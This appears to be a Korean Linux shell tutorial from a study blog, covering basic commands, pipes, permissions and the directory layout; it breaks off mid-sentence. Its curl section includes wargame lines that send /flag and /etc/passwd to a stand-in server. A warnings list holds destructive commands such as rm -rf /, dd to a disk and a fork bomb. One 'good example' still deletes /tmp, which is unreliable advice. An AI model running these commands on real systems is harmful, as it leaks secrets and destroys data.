[{"content":"셸(Shell) 셸은 사용자와 커널 사이에서 명령어를 해석하고 실행하는 인터페이스입니다.\n터미널 실행 단축키 Windows/Linux: Ctrl + Alt + T macOS: Control + Option + T 셸 프롬프트(Shell Prompt) 셸이 입력을 받을 준비가 되면 다음과 같은 프롬프트가 표시됩니다:\n1 user@user-VirtualBox:~$ 프롬프트 구조:\nuser: 현재 로그인한 사용자 이름 user-VirtualBox: 호스트(컴퓨터) 이름 ~: 현재 위치한 디렉토리 (홈 디렉토리) $: 일반 사용자 (#는 root) id 명령어 현재 사용자의 UID와 GID를 확인합니다.\n1 id 출력:\nuid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo) 기본 명령어 시스템 정보 및 관리 sudo apt update apt 명령어로 설치 가능한 소프트웨어 패키지 목록을 업데이트합니다.\n1 sudo apt update sudo apt upgrade 리눅스에 설치된 소프트웨어 패키지의 버전을 업그레이드합니다.\n1 sudo apt upgrade 디렉토리 탐색 pwd 현재 작업 중인 디렉토리의 경로를 출력합니다.\n1 pwd 출력:\n/home/user ls 디렉토리의 내용을 출력합니다.\n기본 사용법:\n1 2 ls # 현재 디렉토리 내용 ls /home # 특정 디렉토리 내용 유용한 옵션:\n1 2 3 4 5 6 ls -l # 상세 정보 포함 ls -a # 숨김 파일 포함 ls -lh # 사람이 읽기 쉬운 파일 크기 ls -lt # 수정 시간순 정렬 ls -lS # 파일 크기순 정렬 ls -lR # 하위 디렉토리까지 재귀적으로 표시 cd 작업 중인 디렉토리를 변경합니다.\n구분 기호/명령어 설명 예시 절대 경로 / 시작 루트 디렉토리부터 모든 경로를 전부 적어서 표현 cd /home/user 상대 경로 .. 등 현재 디렉토리를 기준으로 상위 또는 하위 디렉토리로 이동 cd .. 홈 디렉토리 ~ 현재 로그인한 사용자의 홈 디렉토리 cd ~ 또는 cd 이전 경로 - 직전에 위치했던 디렉토리 cd - 현재 디렉토리 . 현재 디렉토리 cd . 파일 및 디렉토리 생성 mkdir 디렉토리를 생성합니다.\n1 2 3 mkdir new_dir # 단일 디렉토리 생성 mkdir dir1 dir2 dir3 # 여러 디렉토리 동시 생성 mkdir -p parent/child/grandchild # 상위 디렉토리까지 자동 생성 touch 비어있는 새로운 파일을 만들거나 기존 파일의 수정 시간을 업데이트합니다.\n1 touch new_file 확인:\n1 ls -l 출력:\n-rw-rw-r-- 1 user user 0 12월 2 13:05 new_file 여러 파일 동시 생성:\n1 touch file1.txt file2.txt file3.txt 파일 및 디렉토리 조작 mv 파일이나 디렉토리의 위치를 옮기거나 이름을 변경합니다.\n이름 변경:\n1 mv old_name new_name 파일 이동:\n1 mv old_file .. 여러 파일을 디렉토리로 이동:\n1 mv file1.txt file2.txt file3.txt /destination/ cp 파일이나 디렉토리를 복사합니다.\n파일 복사:\n1 cp hello world 디렉토리 복사:\n1 cp -r source_dir destination_dir # 디렉토리 전체 복사 유용한 옵션:\n1 2 3 cp -i file1 file2 # 덮어쓰기 전 확인 cp -v file1 file2 # 복사 과정 표시 cp -u file1 file2 # 더 최신 파일만 복사 rm 파일이나 디렉토리를 삭제합니다.\n파일 삭제:\n1 rm file.txt 디렉토리 삭제:\n1 rm -r directory_name # 디렉토리와 내용물 전체 삭제 유용한 옵션:\n1 2 3 rm -i file.txt # 삭제 전 확인 rm -f file.txt # 강제 삭제 (확인 없이) rm -rf directory/ # 디렉토리 강제 삭제 (주의!) 파일 내용 보기 cat 파일의 내용을 출력합니다.\n1 cat /etc/passwd 여러 파일 연결:\n1 cat file1.txt file2.txt \u0026gt; combined.txt head / tail 파일의 처음 또는 끝 부분만 출력합니다.\n1 2 3 4 5 head file.txt # 처음 10줄 head -n 20 file.txt # 처음 20줄 tail file.txt # 마지막 10줄 tail -n 50 file.txt # 마지막 50줄 tail -f log.txt # 실시간 로그 모니터링 less / more 파일 내용을 페이지 단위로 보여줍니다.\n1 2 less large_file.txt # 위아래 스크롤 가능, 검색 가능 (추천) more large_file.txt # 한 방향으로만 스크롤 less 명령어 내부에서:\nSpace: 다음 페이지 b: 이전 페이지 /word: 단어 검색 q: 종료 file 파일의 유형을 출력합니다.\n1 file /bin/ls 출력:\n/bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV) 다양한 파일 타입 확인:\n1 2 3 file document.pdf # PDF document file image.jpg # JPEG image data file script.sh # Bourne-Again shell script 텍스트 출력 및 생성 echo 셸에 사용자가 입력한 텍스트를 출력합니다.\n1 echo \u0026#34;Hello world!\u0026#34; 파일로 리다이렉션:\n1 echo \u0026#34;Hello world!\u0026#34; \u0026gt; hello 파일에 추가:\n1 echo \u0026#34;Another line\u0026#34; \u0026gt;\u0026gt; hello 변수 출력:\n1 2 3 echo $HOME # 홈 디렉토리 경로 echo $PATH # PATH 환경 변수 echo $USER # 현재 사용자 이름 검색 및 필터링 grep 전체에서 특정 문자열을 찾습니다.\n기본 사용:\n1 grep root /etc/passwd 유용한 옵션:\n1 2 3 4 5 6 7 grep -i \u0026#34;error\u0026#34; log.txt # 대소문자 구분 없이 검색 grep -r \u0026#34;TODO\u0026#34; . # 현재 디렉토리에서 재귀 검색 grep -n \u0026#34;function\u0026#34; script.py # 줄 번호 포함 grep -v \u0026#34;comment\u0026#34; file.txt # 패턴과 일치하지 않는 줄 grep -c \u0026#34;error\u0026#34; log.txt # 일치하는 줄 개수만 출력 grep -A 3 \u0026#34;error\u0026#34; log.txt # 일치 줄 + 다음 3줄 grep -B 2 \u0026#34;error\u0026#34; log.txt # 일치 줄 + 이전 2줄 find 파일과 디렉토리를 검색합니다.\n1 2 3 4 5 6 7 find /home -name \u0026#34;*.txt\u0026#34; # 이름으로 검색 find . -type f -name \u0026#34;test*\u0026#34; # 파일만 검색 find . -type d -name \u0026#34;backup\u0026#34; # 디렉토리만 검색 find . -mtime -7 # 최근 7일 수정된 파일 find . -size +100M # 100MB 이상 파일 find . -name \u0026#34;*.log\u0026#34; -delete # 찾은 파일 삭제 find . -name \u0026#34;*.sh\u0026#34; -exec chmod +x {} \\; # 찾은 파일에 명령 실행 which / whereis 명령어나 프로그램의 위치를 찾습니다.\n1 2 3 which python # python 명령어의 실행 파일 위치 which gcc # gcc 컴파일러 위치 whereis ls # ls 명령어의 바이너리, 소스, 매뉴얼 위치 프로세스 관리 ps 현재 실행 중인 프로세스를 확인합니다.\n1 2 3 4 ps # 현재 터미널의 프로세스 ps aux # 모든 프로세스 상세 정보 ps aux | grep nginx # 특정 프로세스 찾기 ps -ef # 전체 프로세스 (다른 포맷) top / htop 실시간으로 시스템 리소스와 프로세스를 모니터링합니다.\n1 2 top # 기본 모니터링 htop # 향상된 인터페이스 (설치 필요: sudo apt install htop) top 내부 명령:\nq: 종료 k: 프로세스 종료 M: 메모리 사용량 정렬 P: CPU 사용량 정렬 kill 프로세스를 종료합니다.\n1 2 3 kill 1234 # PID 1234 프로세스 종료 kill -9 1234 # 강제 종료 killall nginx # 이름으로 모든 nginx 프로세스 종료 도움말 man 특정 명령어의 매뉴얼을 보여줍니다.\n1 2 3 man ls # ls 명령어 매뉴얼 man grep # grep 명령어 매뉴얼 man 5 passwd # /etc/passwd 파일 형식 매뉴얼 man 페이지 탐색:\nSpace: 다음 페이지 b: 이전 페이지 /word: 검색 q: 종료 help / \u0026ndash;help 간단한 도움말을 출력합니다.\n1 2 3 ls --help cp --help help cd # 내장 명령어 네트워크 curl 서버에 데이터를 보내거나 서버로부터 받는 데이터 전송 명령어입니다.\n기본 사용:\n1 curl https://example.com # 웹 페이지 내용 가져오기 주요 옵션:\n1 2 3 4 curl -o file.html https://example.com # 파일로 저장 curl -O https://example.com/file.zip # 원본 이름으로 저장 curl -i https://example.com # 응답 헤더 포함 curl -L https://example.com # 리다이렉트 따라가기 HTTP 메소드:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # GET 요청 (기본) curl https://api.example.com/users # POST 요청 curl -X POST https://api.example.com/data \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;:\u0026#34;John\u0026#34;,\u0026#34;age\u0026#34;:30}\u0026#39; # PUT 요청 curl -X PUT https://api.example.com/users/1 \\ -d \u0026#34;name=Jane\u0026#34; # DELETE 요청 curl -X DELETE https://api.example.com/users/1 워게임에서의 활용:\n1 2 3 4 5 # 명령어 실행 결과를 서버로 전송 curl \u0026#34;http://myserver.com\u0026#34; -d \u0026#34;`cat /flag`\u0026#34; # 파일 내용 전송 curl -X POST http://myserver.com -d \u0026#34;@/etc/passwd\u0026#34; wget 파일을 다운로드합니다.\n1 2 3 4 wget https://example.com/file.zip # 파일 다운로드 wget -O custom_name.zip https://... # 다른 이름으로 저장 wget -c https://example.com/large.iso # 중단된 다운로드 이어받기 wget -r https://example.com # 웹사이트 전체 다운로드 압축 및 아카이브 tar 파일을 묶고 압축합니다.\n1 2 3 4 5 tar -cvf archive.tar files/ # 묶기 tar -czvf archive.tar.gz files/ # 묶고 gzip 압축 tar -xvf archive.tar # 풀기 tar -xzvf archive.tar.gz # gzip 압축 해제하며 풀기 tar -tvf archive.tar # 내용 확인 옵션 의미:\nc: create (생성) x: extract (추출) v: verbose (과정 표시) f: file (파일 지정) z: gzip 압축/해제 j: bzip2 압축/해제 zip / unzip zip 형식으로 압축합니다.\n1 2 3 4 zip archive.zip file1 file2 # 압축 zip -r archive.zip directory/ # 디렉토리 압축 unzip archive.zip # 압축 해제 unzip -l archive.zip # 내용만 확인 디스크 사용량 du 디렉토리와 파일의 디스크 사용량을 확인합니다.\n1 2 3 4 du -h # 사람이 읽기 쉬운 형식 du -sh * # 현재 디렉토리의 각 항목 크기 du -sh /home/user # 특정 디렉토리 전체 크기 du -h --max-depth=1 # 1단계 깊이까지만 df 파일 시스템의 디스크 공간 사용량을 확인합니다.\n1 2 df -h # 모든 파일 시스템 df -h /home # 특정 디렉토리가 속한 파일 시스템 고급 기능 와일드카드 와일드카드는 임의의 다른 문자를 나타낼 수 있는 특수 문자입니다.\n기본 와일드카드\n? - 임의의 1개 문자\n1 2 ls file?.txt # file1.txt, fileA.txt 등 매칭 ls test? # test1, testa 등 매칭 * - 임의의 0개 이상 문자\n1 2 3 ls *.txt # 모든 .txt 파일 ls test* # test로 시작하는 모든 파일 ls *backup* # backup이 포함된 모든 파일 [] - 범위 지정\n1 2 3 ls file[1-3].txt # file1.txt, file2.txt, file3.txt ls [abc]* # a, b, c로 시작하는 파일 ls *.[ch] # .c 또는 .h로 끝나는 파일 실전 예시\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # .txt로 끝나는 모든 파일 삭제 rm *.txt # file1, file2, file3... file9 선택 ls file[1-9] # 이름이 정확히 3글자인 모든 파일 ls ??? # test로 시작하는 모든 파일을 /backup/으로 복사 cp test* /backup/ # 2024년 로그 파일 전체 보기 cat log-2024-*.txt # JPG 또는 PNG 이미지 파일 이동 mv *.{jpg,png} images/ 리다이렉션 리다이렉션은 모니터에 나타나는 표준 출력 혹은 키보드로 입력하는 표준 입력을 다른 곳으로 변경하는 작업입니다.\n표준 스트림\n표준 입력 (stdin): 0번, 키보드로부터의 입력 표준 출력 (stdout): 1번, 화면으로의 정상 출력 표준 에러 (stderr): 2번, 화면으로의 에러 메시지 출력 리다이렉션\n명령어 \u0026gt; 파일\n1 2 ls -l \u0026gt; file_list.txt # 출력을 파일에 저장 (덮어쓰기) echo \u0026#34;Hello\u0026#34; \u0026gt; greeting.txt 명령어 \u0026gt;\u0026gt; 파일\n1 2 3 echo \u0026#34;Line 1\u0026#34; \u0026gt; log.txt # 새로 생성 echo \u0026#34;Line 2\u0026#34; \u0026gt;\u0026gt; log.txt # 추가 echo \u0026#34;Line 3\u0026#34; \u0026gt;\u0026gt; log.txt # 추가 명령어 2\u0026gt; 파일\n1 2 3 4 command 2\u0026gt; error.log # 에러만 파일에 저장 command \u0026gt; output.txt 2\u0026gt; error.log # 출력과 에러 분리 command \u0026gt; output.txt 2\u0026gt;\u0026amp;1 # 출력과 에러를 같은 파일에 command \u0026amp;\u0026gt; all.log # 출력과 에러를 같은 파일에 (축약형) 입력 리다이렉션\n명령어 \u0026lt; 파일\n1 2 sort \u0026lt; unsorted.txt # 파일 내용을 정렬 wc -l \u0026lt; file.txt # 파일 줄 수 세기 Here Document\n1 2 3 4 5 cat \u0026lt;\u0026lt; EOF \u0026gt; file.txt 여러 줄의 텍스트를 입력할 수 있습니다 EOF 파이프 파이프는 리다이렉션의 한 형태로, 명령어 결과 표준 출력을 다른 명령어의 표준 입력으로 보낼 때 사용합니다. | 문자로 나타냅니다.\n기본 사용\n1 2 3 ls -l | grep \u0026#34;.txt\u0026#34; # ls 출력에서 .txt 검색 cat file.txt | wc -l # 파일 줄 수 세기 ps aux | grep nginx # 프로세스 필터링 실전 파이프 활용\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # 가장 많이 사용하는 명령어 top 10 history | awk \u0026#39;{print $2}\u0026#39; | sort | uniq -c | sort -rn | head # 특정 프로세스의 메모리 사용량 확인 ps aux | grep nginx | awk \u0026#39;{print $6}\u0026#39; # 로그에서 에러만 필터링하여 개수 확인 cat app.log | grep ERROR | wc -l # 디렉토리별 용량 확인 후 정렬 du -sh */ | sort -h # 가장 큰 파일 10개 찾기 du -ah | sort -rh | head -10 # 특정 확장자 파일 개수 find . -name \u0026#34;*.py\u0026#34; | wc -l # CPU 사용률 높은 프로세스 상위 5개 ps aux | sort -nrk 3 | head -5 # 특정 포트를 사용하는 프로세스 찾기 netstat -tuln | grep :80 # 중복 제거된 정렬된 목록 cat list.txt | sort | uniq # 로그에서 IP 주소 추출 및 빈도 분석 grep -oE \u0026#39;\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b\u0026#39; access.log | sort | uniq -c | sort -rn 권한 사용자(user)와 그룹(group) 리눅스의 각 사용자는 이름과 고유한 사용자 ID(UID)를 가집니다. 그룹은 여러 사용자가 속할 수 있으며, 그룹 이름과 고유한 그룹 ID(GID)를 가집니다.\n파일이나 디렉토리에 사용자가 접근하면 사용자의 UID와 해당 사용자가 속한 그룹의 GID를 확인하여 정당한 권한을 가지고 있는지를 판단해 접근을 제어합니다.\n사용자 정보 확인\n/etc/passwd는 리눅스의 사용자 정보를 담고 있는 텍스트 파일입니다.\n1 cat /etc/passwd 각 줄의 형식: username:x:UID:GID:comment:home_directory:shell\n예시:\nroot:x:0:0:root:/root:/bin/bash\ruser:x:1000:1000:user,,,:/home/user:/bin/bash 그룹 정보 확인\n/etc/group은 리눅스의 그룹 정보를 저장하는 텍스트 파일입니다.\n1 cat /etc/group 사용자 관련 명령어\n1 2 3 4 whoami # 현재 사용자 이름 id # 현재 사용자의 UID, GID 정보 groups # 현재 사용자가 속한 그룹들 users # 현재 로그인한 사용자들 파일 및 디렉토리 권한 리눅스는 사용자가 파일과 디렉토리에 접근하는 행위에 대해 권한으로 제어합니다. 각 파일과 디렉토리는 **소유자(owner)**와 **소유 그룹(group)**을 가집니다. 소유자는 파일 또는 디렉토리의 권한을 수정할 수 있는 능력을 가집니다.\n세 가지 접근 권한\n읽기(Read, r): 파일 또는 디렉토리의 내용을 볼 수 있게 허용합니다.\n파일: 파일 내용을 읽을 수 있음 디렉토리: 디렉토리 내 파일 목록을 볼 수 있음 쓰기(Write, w): 파일 또는 디렉토리의 내용을 수정하거나 삭제하는 것을 허용합니다.\n파일: 파일 내용을 수정하거나 삭제할 수 있음 디렉토리: 디렉토리 내에 파일을 생성하거나 삭제할 수 있음 실행(Execute, x): 파일이 프로그램인 경우 실행할 수 있게 허용합니다.\n파일: 프로그램으로 실행할 수 있음 디렉토리: 디렉토리에 접근(cd)할 수 있음 권한 확인하기\n파일이나 디렉토리의 권한을 보기 위해 ls -l을 사용합니다.\n1 ls -l 출력 예시:\ntotal 12\rdrwxrwxr-x 2 user user 4096 12월 2 13:38 dir\r---------- 1 user user 13 12월 2 13:05 hello\r-rwxrw-r-- 1 user user 13 12월 2 13:08 world 권한 플래그 해석 1 drwxrwxr-x 2 user user 4096 12월 2 13:38 dir 권한 플래그 drwxrwxr-x는 4개 부분으로 나뉩니다:\nd rwx rwx r-x\r│ └┬┘ └┬┘ └┬┘\r│ │ │ └──→ 기타 사용자 권한 (r-x: 읽기, 실행)\r│ │ └──────→ 그룹 권한 (rwx: 읽기, 쓰기, 실행)\r│ └──────────→ 소유자 권한 (rwx: 읽기, 쓰기, 실행)\r└─────────────→ 파일 타입 (d: 디렉토리) 파일 타입 (첫 번째 문자)\nd: 디렉토리 (directory) -: 일반 파일 (regular file) l: 심볼릭 링크 (symbolic link) b: 블록 디바이스 (block device) c: 문자 디바이스 (character device) s: 소켓 (socket) p: 파이프 (pipe) 권한 문자\nr: 읽기 권한 (Read) w: 쓰기 권한 (Write) x: 실행 권한 (Execute) -: 해당 권한 없음 권한의 숫자 표현\n권한은 2진수나 10진수로도 표현할 수 있습니다.\n권한 2진수 10진수 의미 --- 000 0 권한 없음 --x 001 1 실행만 -w- 010 2 쓰기만 -wx 011 3 쓰기, 실행 r-- 100 4 읽기만 r-x 101 5 읽기, 실행 rw- 110 6 읽기, 쓰기 rwx 111 7 모든 권한 예시:\nrwx = 111 = 7 rw- = 110 = 6 r-- = 100 = 4 rwxrw-r-- = 764 소유자와 소유 그룹\n1 2 3 drwxrwxr-x 2 user user 4096 12월 2 13:38 dir ↑ ↑ 소유자 소유그룹 세 번째 열: 파일/디렉토리의 소유자 네 번째 열: 파일/디렉토리의 소유 그룹 종합 예시\n1 -rwxrw-r-- 1 user user 13 12월 2 13:08 world 해석:\n파일 타입: - (일반 파일) 소유자 권한: rwx (읽기, 쓰기, 실행 가능) 그룹 권한: rw- (읽기, 쓰기 가능, 실행 불가) 기타 권한: r-- (읽기만 가능) 소유자: user 소유 그룹: user 파일 및 디렉토리 권한 명령어 chmod chmod는 파일 권한을 변경하는 명령어입니다. root 사용자 혹은 파일의 소유자만 실행할 수 있습니다.\n형식\n1 chmod 권한 파일명 숫자 모드\n1 chmod 764 hello 확인:\n1 ls -l 출력:\n-rwxrw-r-- 1 user user 13 12월 2 13:05 hello 기호 모드\n대상:\nu: 소유자 (user) g: 그룹 (group) o: 기타 (others) a: 모두 (all) 연산:\n+: 권한 추가 -: 권한 제거 =: 권한 설정 권한 추가:\n1 chmod g+x hello 출력:\n-rwxrwxr-- 1 user user 13 12월 2 13:05 hello 권한 제거:\n1 chmod g-wx hello 출력:\n-rwxr--r-- 1 user user 13 12월 2 13:05 hello 유용한 예시\n1 2 3 4 5 6 7 8 chmod 644 file.txt # rw-r--r-- (일반 파일) chmod 755 script.sh # rwxr-xr-x (실행 파일) chmod 700 private.txt # rwx------ (소유자만 접근) chmod 777 public_dir # rwxrwxrwx (모두 접근, 위험!) chmod -R 755 directory/ # 디렉토리와 내부 파일 전체에 적용 chmod u+x script.sh # 소유자에게 실행 권한 추가 chmod a-w file.txt # 모두에게서 쓰기 권한 제거 chmod o-rwx private # 기타 사용자 모든 권한 제거 chown chown은 파일 소유자 혹은 소유 그룹을 변경하는 명령어입니다. root 사용자만 실행할 수 있습니다.\n형식\n1 chown 사용자명[:그룹명] 파일명 소유자 변경\n1 sudo chown root hello 확인:\n1 ls -l 출력:\n-rwxr--r-- 1 root user 13 12월 2 13:05 hello 이제 일반 사용자는 이 파일을 수정할 수 없습니다:\n1 echo \u0026#34;hello\u0026#34; \u0026gt; hello 출력:\nbash: hello: Permission denied 소유자와 그룹 동시 변경\n1 2 3 sudo chown root:root hello # 소유자와 그룹을 root로 sudo chown user:developers file.txt # 특정 사용자와 그룹으로 sudo chown -R user:user directory/ # 디렉토리 전체에 재귀적으로 적용 chgrp chgrp는 소유 그룹만 변경하는 명령어입니다.\n1 2 sudo chgrp developers file.txt # 그룹만 변경 sudo chgrp -R www-data /var/www/ # 디렉토리 전체에 적용 특수 권한 앞서 배운 r, w, x 권한 외에 특수한 권한 3가지가 있습니다.\nsetuid (Set User ID) 일반 사용자가 파일을 실행하면 파일 소유자 권한으로 실행됩니다.\n예시: /bin/passwd\n1 ls -l /bin/passwd 출력:\n-rwsr-xr-x 1 root root 59976 11월 24 21:05 passwd 소유자의 실행 권한에 x 대신 s가 표시됩니다. 일반 사용자가 passwd 명령을 실행하면 root 권한으로 실행되어 자신의 비밀번호를 변경할 수 있습니다.\ns: setuid가 설정되고 실행 권한도 있음 S: setuid는 설정되었지만 실행 권한이 없음 (의미 없음) setgid (Set Group ID) 일반 사용자가 파일을 실행하면 파일 소유 그룹 권한으로 실행됩니다.\n소유 그룹의 실행 권한에 x 대신 s가 표시됩니다.\n디렉토리에 setgid를 설정하면 해당 디렉토리 내에서 생성되는 모든 파일이 디렉토리의 그룹을 상속받습니다.\ndrwxr-sr-x 2 user developers 4096 12월 2 13:38 shared_dir s: setgid가 설정되고 실행 권한도 있음 S: setgid는 설정되었지만 실행 권한이 없음 sticky bit 디렉토리에 sticky bit를 설정하면 파일 및 디렉토리 소유자와 root 사용자 외에는 일반 사용자가 파일을 삭제할 수 없습니다. 주로 공용 디렉토리에 사용합니다.\n예시: /tmp 디렉토리\ndrwxrwxrwt 20 root root 4096 12월 1 14:17 tmp 일반 사용자의 실행 권한에 x 대신 t가 표시됩니다.\nt: sticky bit가 설정되고 실행 권한도 있음 T: sticky bit는 설정되었지만 실행 권한이 없음 특수 권한 설정 특수 권한은 숫자 형식으로 권한 플래그 맨 앞에 붙여 표현합니다:\nsetuid: 4 setgid: 2 sticky bit: 1 숫자 모드\n1 chmod 4775 world 확인:\n1 ls -l 출력:\n-rwsrwxr-x 1 user user 13 12월 2 13:08 world 기호 모드\n1 2 3 4 chmod u+s file # setuid 설정 chmod g+s directory # setgid 설정 chmod o+t directory # sticky bit 설정 chmod u-s file # setuid 제거 조합 예시\n1 2 3 4 chmod 4755 program # rwsr-xr-x (setuid) chmod 2755 shared_dir # rwxr-sr-x (setgid) chmod 1777 /tmp # rwxrwxrwt (sticky bit) chmod 6755 file # rwsr-sr-x (setuid + setgid) 디렉토리 구조 루트 디렉토리 / 루트 디렉토리는 리눅스의 최상위 디렉토리이며, 절대 경로는 /입니다.\n1 ls -l / 출력 예시:\nlrwxrwxrwx 1 root root 7 11월 30 18:15 bin -\u0026gt; usr/bin\rdrwxr-xr-x 4 root root 4096 12월 1 14:10 boot\rdrwxr-xr-x 19 root root 4180 12월 1 14:25 dev\rdrwxr-xr-x 130 root root 12288 12월 1 14:09 etc\rdrwxr-xr-x 3 root root 4096 11월 30 18:27 home\rdrwx------ 2 root root 16384 11월 30 18:14 lost+found\rdrwxr-xr-x 3 root root 4096 11월 30 19:49 media\rdrwxr-xr-x 2 root root 4096 8월 9 20:48 mnt\rdrwxr-xr-x 3 root root 4096 11월 30 19:55 opt\rdr-xr-xr-x 257 root root 0 12월 1 14:11 proc\rdrwx------ 4 root root 4096 12월 1 14:17 root\rdrwxr-xr-x 33 root root 900 12월 1 14:12 run\rlrwxrwxrwx 1 root root 8 11월 30 18:15 sbin -\u0026gt; usr/sbin\rdrwxr-xr-x 2 root root 4096 8월 9 20:48 srv\rdr-xr-xr-x 13 root root 0 12월 1 14:11 sys\rdrwxrwxrwt 20 root root 4096 12월 1 14:17 tmp\rdrwxr-xr-x 14 root root 4096 8월 9 20:48 usr\rdrwxr-xr-x 14 root root 4096 8월 9 20:54 var 주요 디렉토리 설명 /bin - 기본 명령어 일반 사용자가 사용할 수 있는 기본적인 명령어나 프로그램을 담고 있는 디렉토리입니다.\nls, cp, mv, rm, cat, echo, mkdir, chmod, ps 등 최신 시스템에서는 /usr/bin으로의 심볼릭 링크입니다.\n/boot - 부팅 파일 시스템 부팅에 필요한 파일들을 담고 있는 디렉토리입니다.\n커널 이미지, 부트로더 설정 파일, initramfs 등 /dev - 디바이스 파일 컴퓨터에 부착된 물리적인 장치들을 파일 형태로 접근할 수 있게 합니다.\n1 2 3 4 5 /dev/sda # 첫 번째 하드 디스크 /dev/sda1 # 첫 번째 하드 디스크의 첫 번째 파티션 /dev/null # null 디바이스 (출력 버리기에 사용) /dev/zero # 0을 무한히 생성 /dev/random # 난수 생성기 /etc - 설정 파일 운영체제나 운영체제 위에서 동작하는 서비스의 설정 파일들을 담고 있는 디렉토리입니다.\n1 2 3 4 5 6 7 /etc/passwd # 사용자 정보 /etc/group # 그룹 정보 /etc/hosts # 호스트 이름 매핑 /etc/hostname # 시스템 호스트명 /etc/ssh/ # SSH 서버 설정 /etc/nginx/ # Nginx 웹서버 설정 /etc/apache2/ # Apache 웹서버 설정 /home - 사용자 홈 디렉토리 각 일반 사용자의 홈 디렉토리를 담고 있는 디렉토리입니다.\n1 2 /home/user # user 사용자의 홈 디렉토리 /home/dream # dream 사용자의 홈 디렉토리 각 사용자는 자신의 홈 디렉토리에서 완전한 권한을 가집니다.\n/lib, /lib32, /lib64 - 라이브러리 시스템에 필요한 라이브러리 파일들을 담고 있는 디렉토리입니다.\n공유 라이브러리, 커널 모듈 등 /bin이나 /sbin의 프로그램이 필요로 하는 동적 라이브러리 파일이 존재합니다.\n/media - 이동식 미디어 이동식 미디어(USB, CD/DVD 등)가 자동으로 마운트되는 디렉토리입니다.\n1 2 /media/user/USB_DRIVE /media/user/CDROM /mnt - 임시 마운트 파일 시스템을 임시로 마운트하는 데 사용하는 디렉토리입니다.\n1 sudo mount /dev/sdb1 /mnt /opt - 선택적 소프트웨어 추가로 설치한 소프트웨어 패키지들을 담는 디렉토리입니다.\n1 2 /opt/google/chrome /opt/teamviewer /proc - 프로세스 정보 리눅스 커널 자원에 접근할 수 있는 가상 파일 시스템입니다. 프로세스와 시스템 정보를 파일 형태로 제공합니다.\n1 2 3 4 /proc/cpuinfo # CPU 정보 /proc/meminfo # 메모리 정보 /proc/[PID]/ # 각 프로세스 정보 /proc/version # 커널 버전 /root - root 사용자 홈 root 사용자의 홈 디렉토리입니다. /home/root가 아님에 주의하세요.\n/run - 런타임 데이터 시스템이 부팅된 이후 런타임 데이터를 저장합니다.\nPID 파일, 소켓 파일 등 /sbin - 시스템 관리 명령어 /bin 디렉토리와 유사하지만, root 사용자가 사용하는 시스템 관리 명령어를 포함합니다.\nfdisk, mkfs, shutdown, reboot, iptables 등 /srv - 서비스 데이터 시스템에서 제공하는 서비스의 데이터를 저장하는 디렉토리입니다.\n1 2 /srv/www # 웹 서버 데이터 /srv/ftp # FTP 서버 데이터 /sys - 시스템 정보 커널과 하드웨어 정보를 제공하는 가상 파일 시스템입니다.\n/tmp - 임시 파일 사용자나 프로그램이 임시로 파일을 생성할 때 사용하는 디렉토리입니다.\n주의: 시스템 재부팅 시 또는 일정 시간이 지나면 파일이 자동으로 삭제될 수 있습니다.\ndrwxrwxrwt # sticky bit로 보호됨 /usr - 사용자 프로그램 사용자 바이너리, 문서, 라이브러리, 헤더 파일 등을 담고 있는 디렉토리입니다.\n1 2 3 4 5 6 /usr/bin/ # 사용자 명령어 /usr/sbin/ # 시스템 관리 명령어 /usr/lib/ # 라이브러리 /usr/local/ # 로컬에 설치한 프로그램 /usr/share/ # 아키텍처 독립적인 데이터 /usr/include/ # C 헤더 파일 /var - 가변 데이터 프로그램이나 시스템이 실시간으로 가변적인 파일을 사용하고 저장할 때 활용하는 디렉토리입니다.\n1 2 3 4 5 6 /var/log/ # 각종 로그 파일 /var/www/ # 웹 서버 루트 (보통) /var/mail/ # 메일 스풀 /var/spool/ # 대기열 데이터 (프린터, cron 등) /var/tmp/ # 재부팅 후에도 유지되는 임시 파일 /var/cache/ # 애플리케이션 캐시 주의사항 및 안전 사용 팁 위험한 명령어들 1 2 3 4 5 6 rm -rf / # 시스템 전체 삭제 (현대 시스템은 보호됨) rm -rf /* # 루트 디렉토리의 모든 내용 삭제 chmod 777 -R / # 모든 파일 권한 열기 (심각한 보안 위험) dd if=/dev/zero of=/dev/sda # 디스크 전체 초기화 mkfs.ext4 /dev/sda # 파티션 포맷 (데이터 삭제) :(){ :|:\u0026amp; };: # Fork bomb (시스템 멈춤) 안전한 사용 습관 1. 삭제 전 항상 확인\n1 2 ls -l file* # 먼저 어떤 파일이 매칭되는지 확인 rm -i file* # 삭제 전 각 파일마다 확인 2. 중요한 작업 전 백업\n1 2 cp important.txt important.txt.backup tar -czf backup_$(date +%Y%m%d).tar.gz /important/directory/ 3. sudo 사용 시 신중하게\n1 2 3 4 5 6 # 나쁜 예 sudo rm -rf /tmp ../file # 경로 실수 시 위험 # 좋은 예 ls -l /tmp ../file # 먼저 확인 sudo rm -rf /tmp ../file # 확인 후 실행 4. 와일드카드 사용 시 주의\n1 2 3 4 5 6 # 나쁜 예 rm * .txt # 모든 파일 삭제 후 .txt 삭제 시도 # 좋은 예 rm *.txt # .txt 파일만 삭제 ls *.txt # 먼저 무엇이 삭제될지 확인 5. 절대 경로 vs 상대 경로\n1 2 3 4 5 6 # 현재 위치를 항상 확인 pwd # 중요한 작업은 절대 경로 사용 rm -rf /home/user/old_project # 명확함 # rm -rf ../../../old_project # 위험할 수 있음 유용한 팁과 트릭 명령어 히스토리 1 2 3 4 5 history # 명령어 이력 보기 !100 # 100번째 명령어 실행 !! # 마지막 명령어 실행 !grep # grep으로 시작하는 마지막 명령어 실행 Ctrl + R # 명령어 이력 검색 (interactive) 단축키 터미널 조작\nCtrl + C # 현재 실행 중인 프로세스 중단\rCtrl + Z # 현재 프로세스 일시 중지\rCtrl + D # 로그아웃 / EOF 전송\rCtrl + L # 화면 지우기 (clear 명령어와 동일) 커서 이동\nCtrl + A # 줄의 시작으로\rCtrl + E # 줄의 끝으로\rCtrl + U # 커서부터 앞쪽 전체 삭제\rCtrl + K # 커서부터 뒷쪽 전체 삭제\rCtrl + W # 커서 앞의 단어 삭제 Tab 자동완성\nTab # 